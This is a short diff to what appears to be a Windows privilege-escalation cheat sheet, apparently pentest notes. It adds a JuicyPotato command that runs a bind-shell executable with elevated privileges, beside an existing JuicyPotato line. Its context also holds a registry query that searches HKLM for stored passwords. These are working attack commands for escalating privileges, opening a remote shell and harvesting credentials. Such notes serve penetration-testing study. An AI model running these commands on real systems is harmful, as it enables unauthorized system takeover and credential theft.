@@ -106,7 +106,11 @@ if(((\[System.Security.Principal.WindowsIdentity\]::GetCurrent()).groups -match 
 
 
 4. JUICYPOTATO
-`.\jp.exe -t * -p 'c:\users\all users\run.bat' -l 1337 -c '{C49E32C6-BC8B-11d2-85D4-00105A1F8304}'`
+```
+.\jp.exe -t * -p 'c:\users\all users\run.bat' -l 1337 -c '{C49E32C6-BC8B-11d2-85D4-00105A1F8304}'
+
+./JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c C:\users\sophie\documents\bind.exe" -t *
+```
 
 5. Query passwords.
 `reg query HKLM /f password /t REG\_SZ /s`
